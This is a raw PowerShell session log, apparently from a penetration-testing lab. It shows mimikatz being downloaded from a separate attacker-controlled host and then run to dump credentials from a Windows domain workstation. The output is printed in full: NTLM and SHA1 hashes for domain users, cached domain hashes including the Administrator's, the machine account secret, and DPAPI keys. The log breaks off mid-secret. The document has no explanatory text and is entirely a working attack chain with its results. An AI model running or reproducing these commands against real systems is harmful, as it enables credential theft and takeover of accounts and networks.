@@ -1,0 +1,603 @@
+
+
+PS C:\Users\milana> iwr -uri http://192.168.45.225:8000/mimikatz.exe -Outfile mimikatz.exe
+
+iwr -uri http://192.168.45.225:8000/mimikatz.exe -Outfile mimikatz.exe
+PS C:\Users\milana> 
+PS C:\Users\milana> .\mimikatz.exe "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump:sam" "lsadump::cache" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" "lsadump::secrets" "sekurlsa::tickets" "sekurlsa::tickets /export" "sekurlsa::msv" "sekurlsa::credman" "vault::cred " "vault::cred /patch" "lsadump::secrets" "exit"
+.\mimikatz.exe "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump:sam" "lsadump::cache" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" "lsadump::secrets" "sekurlsa::tickets" "sekurlsa::tickets /export" "sekurlsa::msv" "sekurlsa::credman" "vault::cred " "vault::cred /patch" "lsadump::secrets" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # log
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+656     {0;000003e7} 1 D 45243          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;00725261} 0 D 9081699     RELIA\milana    S-1-5-21-3972710054-930304531-4277621697-1124        (12g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 9153092     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)   Impersonation (Delegation)
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 9081733 (00000000:008a9385)
+Session           : Batch from 0
+User Name         : milana
+Domain            : RELIA
+Logon Server      : DC02
+Logon Time        : 8/10/2024 12:06:05 AM
+SID               : S-1-5-21-3972710054-930304531-4277621697-1124
+        msv :
+         [00000003] Primary
+         * Username : milana
+         * Domain   : RELIA
+         * NTLM     : 2237ff5905ec2fd9ebbdfa3a14d1b2b6
+         * SHA1     : 8fbfacb4cd81bf90182eff93addc472fa4295327
+         * DPAPI    : 8ae88723d224e3854f7b53f1b59dafcf
+        tspkg :
+        wdigest :
+         * Username : milana
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : milana
+         * Domain   : RELIA.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 7492193 (00000000:00725261)
+Session           : Batch from 0
+User Name         : milana
+Domain            : RELIA
+Logon Server      : DC02
+Logon Time        : 8/9/2024 11:48:55 PM
+SID               : S-1-5-21-3972710054-930304531-4277621697-1124
+        msv :
+         [00000003] Primary
+         * Username : milana
+         * Domain   : RELIA
+         * NTLM     : 2237ff5905ec2fd9ebbdfa3a14d1b2b6
+         * SHA1     : 8fbfacb4cd81bf90182eff93addc472fa4295327
+         * DPAPI    : 8ae88723d224e3854f7b53f1b59dafcf
+        tspkg :
+        wdigest :
+         * Username : milana
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : milana
+         * Domain   : RELIA.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 5607079 (00000000:00558ea7)
+Session           : RemoteInteractive from 2
+User Name         : andrea
+Domain            : RELIA
+Logon Server      : DC02
+Logon Time        : 8/9/2024 11:22:40 PM
+SID               : S-1-5-21-3972710054-930304531-4277621697-1106
+        msv :
+         [00000003] Primary
+         * Username : andrea
+         * Domain   : RELIA
+         * NTLM     : ce3f12443651168b3793f5fbcccff9db
+         * SHA1     : 65b6774d091b82d025fc5422368f9d3d34589b84
+         * DPAPI    : 6739979a37698ce72d0401422d3203c2
+        tspkg :
+        wdigest :
+         * Username : andrea
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : andrea
+         * Domain   : RELIA.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 5590661 (00000000:00554e85)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/9/2024 11:22:40 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 3b532cfbff7ca357f34fc01853e246c8
+         * SHA1     : e3ed9d85150338c7d2e0dd34aca8db18298201e0
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : WK02$
+         * Domain   : relia.com
+         * Password : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 5590599 (00000000:00554e47)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/9/2024 11:22:40 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 3b532cfbff7ca357f34fc01853e246c8
+         * SHA1     : e3ed9d85150338c7d2e0dd34aca8db18298201e0
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : WK02$
+         * Domain   : relia.com
+         * Password : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 5588911 (00000000:005547af)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/9/2024 11:22:40 PM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 3b532cfbff7ca357f34fc01853e246c8
+         * SHA1     : e3ed9d85150338c7d2e0dd34aca8db18298201e0
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : WK02$
+         * Domain   : relia.com
+         * Password : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 654086 (00000000:0009fb06)
+Session           : Batch from 0
+User Name         : offsec
+Domain            : WK02
+Logon Server      : WK02
+Logon Time        : 5/29/2024 9:59:53 AM
+SID               : S-1-5-21-2398429190-2702603168-1445831987-1001
+        msv :
+         [00000003] Primary
+         * Username : offsec
+         * Domain   : WK02
+         * NTLM     : cf998001c44803b490a46f363a2ca812
+         * SHA1     : 1854bca244c6d6c14418f08e7dd7bb72393e1bfa
+        tspkg :
+        wdigest :
+         * Username : offsec
+         * Domain   : WK02
+         * Password : (null)
+        kerberos :
+         * Username : offsec
+         * Domain   : WK02
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/29/2024 9:57:42 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 81716 (00000000:00013f34)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/29/2024 9:57:41 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 45405dfe3c29b4ce2a194543cad1bab3
+         * SHA1     : ede40511c44b734a298b8d0cf6303190961ecd7b
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : WK02$
+         * Domain   : relia.com
+         * Password : 23 0f 41 6c 39 54 1c 4d 3c d8 8c 01 2b b7 b0 68 5d b0 c2 7d cd ce 96 d5 57 b1 b2 1d 83 1d 44 f2 95 d8 fb 29 74 07 65 60 09 56 9e 2c 32 b9 19 2b bb 67 b3 1c 0b bd ca 88 a7 52 50 c5 0f 98 4b 20 fd 31 67 74 b6 ca 64 56 6a 9e 50 30 b0 43 73 bc 2d 92 21 a1 10 fb 3d 73 cd 1c 24 23 63 9b 63 7d 4a 17 4e d8 ff 68 f7 a9 e1 e1 1c 9a 3e 8a 0b 3e b5 79 a9 9d b9 f8 16 98 56 95 85 fe f4 ed f1 fe f8 ee b8 24 53 44 9d 64 2a c9 ab e0 56 56 6b 66 42 8f ef 20 58 76 7e ea 70 f8 18 a1 29 0b c3 e8 4c a6 f1 8e b4 88 42 b1 d6 34 e1 84 b4 d5 dd b8 2c 84 bc 98 fd 6b 91 1a a1 82 a8 16 cc 31 80 3d 58 20 c4 f9 14 a7 23 db ff a0 41 74 57 da 39 c9 3a 82 2b 82 91 f3 d4 0e f2 39 ad 07 54 68 da 58 b2 99 28 d3 af 7d 5c 06 b5 19 1e df 87 f6 13 82 
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 81698 (00000000:00013f22)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/29/2024 9:57:41 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 3b532cfbff7ca357f34fc01853e246c8
+         * SHA1     : e3ed9d85150338c7d2e0dd34aca8db18298201e0
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : WK02$
+         * Domain   : relia.com
+         * Password : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WK02$
+Domain            : RELIA
+Logon Server      : (null)
+Logon Time        : 5/29/2024 9:57:41 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 3b532cfbff7ca357f34fc01853e246c8
+         * SHA1     : e3ed9d85150338c7d2e0dd34aca8db18298201e0
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : wk02$
+         * Domain   : RELIA.COM
+         * Password : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 51011 (00000000:0000c743)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/29/2024 9:57:41 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 3b532cfbff7ca357f34fc01853e246c8
+         * SHA1     : e3ed9d85150338c7d2e0dd34aca8db18298201e0
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : WK02$
+         * Domain   : relia.com
+         * Password : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 50995 (00000000:0000c733)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/29/2024 9:57:41 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 3b532cfbff7ca357f34fc01853e246c8
+         * SHA1     : e3ed9d85150338c7d2e0dd34aca8db18298201e0
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : WK02$
+         * Domain   : relia.com
+         * Password : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 49029 (00000000:0000bf85)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 5/29/2024 9:57:41 AM
+SID               : 
+        msv :
+         [00000003] Primary
+         * Username : WK02$
+         * Domain   : RELIA
+         * NTLM     : 3b532cfbff7ca357f34fc01853e246c8
+         * SHA1     : e3ed9d85150338c7d2e0dd34aca8db18298201e0
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :       KO
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WK02$
+Domain            : RELIA
+Logon Server      : (null)
+Logon Time        : 5/29/2024 9:57:41 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WK02$
+         * Domain   : RELIA
+         * Password : (null)
+        kerberos :
+         * Username : wk02$
+         * Domain   : RELIA.COM
+         * Password : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+        ssp :
+        credman :
+        cloudap :       KO
+
+mimikatz(commandline) # lsadump:sam
+ERROR mimikatz_doLocal ; "lsadump:sam" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz(commandline) # lsadump::cache
+Domain : WK02
+SysKey : 3c14829aac20b1d386e8a4ddfbb3ce24
+
+Local name : WK02 ( S-1-5-21-2398429190-2702603168-1445831987 )
+Domain name : RELIA ( S-1-5-21-3972710054-930304531-4277621697 )
+Domain FQDN : relia.com
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {3eb3b21a-50ed-c913-d664-95250abeda28}
+  [00] {3eb3b21a-50ed-c913-d664-95250abeda28} 3e4e9f1fb888cf476d21b61709d8d5febdee0ebaec53206805f7a2b8ea2f14b6
+
+* Iteration is set to default (10240)
+
+[NL$1 - 8/9/2024 11:22:40 PM]
+RID       : 00000452 (1106)
+User      : RELIA\andrea
+MsCacheV2 : cdf25cc54e29f88b0092e171fe58efe5
+
+[NL$2 - 10/19/2022 8:34:40 AM]
+RID       : 000001f4 (500)
+User      : RELIA\Administrator
+MsCacheV2 : 8d0b95a7748459ac911dc767ee3fd4b2
+
+[NL$3 - 8/10/2024 12:06:05 AM]
+RID       : 00000464 (1124)
+User      : RELIA\milana
+MsCacheV2 : 46328397c3a4dc2f62d1ecc563b31c91
+
+mimikatz(commandline) # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz(commandline) # sekurlsa::logonpasswords full
+Opening : 'lsass.dmp' file for minidump...
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
+
+mimikatz(commandline) # lsadump::secrets
+Domain : WK02
+SysKey : 3c14829aac20b1d386e8a4ddfbb3ce24
+
+Local name : WK02 ( S-1-5-21-2398429190-2702603168-1445831987 )
+Domain name : RELIA ( S-1-5-21-3972710054-930304531-4277621697 )
+Domain FQDN : relia.com
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {3eb3b21a-50ed-c913-d664-95250abeda28}
+  [00] {3eb3b21a-50ed-c913-d664-95250abeda28} 3e4e9f1fb888cf476d21b61709d8d5febdee0ebaec53206805f7a2b8ea2f14b6
+
+Secret  : $MACHINE.ACC
+cur/hex : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+    NTLM:3b532cfbff7ca357f34fc01853e246c8
+    SHA1:e3ed9d85150338c7d2e0dd34aca8db18298201e0
+old/hex : 23 0f 41 6c 39 54 1c 4d 3c d8 8c 01 2b b7 b0 68 5d b0 c2 7d cd ce 96 d5 57 b1 b2 1d 83 1d 44 f2 95 d8 fb 29 74 07 65 60 09 56 9e 2c 32 b9 19 2b bb 67 b3 1c 0b bd ca 88 a7 52 50 c5 0f 98 4b 20 fd 31 67 74 b6 ca 64 56 6a 9e 50 30 b0 43 73 bc 2d 92 21 a1 10 fb 3d 73 cd 1c 24 23 63 9b 63 7d 4a 17 4e d8 ff 68 f7 a9 e1 e1 1c 9a 3e 8a 0b 3e b5 79 a9 9d b9 f8 16 98 56 95 85 fe f4 ed f1 fe f8 ee b8 24 53 44 9d 64 2a c9 ab e0 56 56 6b 66 42 8f ef 20 58 76 7e ea 70 f8 18 a1 29 0b c3 e8 4c a6 f1 8e b4 88 42 b1 d6 34 e1 84 b4 d5 dd b8 2c 84 bc 98 fd 6b 91 1a a1 82 a8 16 cc 31 80 3d 58 20 c4 f9 14 a7 23 db ff a0 41 74 57 da 39 c9 3a 82 2b 82 91 f3 d4 0e f2 39 ad 07 54 68 da 58 b2 99 28 d3 af 7d 5c 06 b5 19 1e df 87 f6 13 82 
+    NTLM:45405dfe3c29b4ce2a194543cad1bab3
+    SHA1:ede40511c44b734a298b8d0cf6303190961ecd7b
+
+Secret  : DefaultPassword
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 39 d8 63 a5 ce 1c 7d 3c 07 3d f3 69 01 d5 15 9e 0b a3 63 1d bc 28 87 e4 29 5b ff bb 52 be 65 d4 3e 15 38 b3 9c 4e 76 5a 
+    full: 39d863a5ce1c7d3c073df36901d5159e0ba3631dbc2887e4295bffbb52be65d43e1538b39c4e765a
+    m/u : 39d863a5ce1c7d3c073df36901d5159e0ba3631d / bc2887e4295bffbb52be65d43e1538b39c4e765a
+old/hex : 01 00 00 00 c6 92 66 62 7b cc 01 3c de 98 53 51 45 0f 1a 15 10 b5 79 1a be 09 42 fc 0d a7 40 ea 70 a4 5e 8b 84 d0 1d 42 63 88 74 df 
+    full: c69266627bcc013cde985351450f1a1510b5791abe0942fc0da740ea70a45e8b84d01d42638874df
+    m/u : c69266627bcc013cde985351450f1a1510b5791a / be0942fc0da740ea70a45e8b84d01d42638874df
+
+Secret  : NL$KM
+cur/hex : 76 a7 53 e9 85 18 b7 ec 26 e8 71 c5 c0 63 e2 45 6a 45 a3 98 84 81 95 a9 90 b1 cf 57 67 1a 26 c2 98 02 15 70 ff 1b 88 92 c0 6b 04 a0 35 53 71 54 e5 b2 5d 9c 2a 8b c2 24 09 e2 9d 9b 05 bf 57 69 
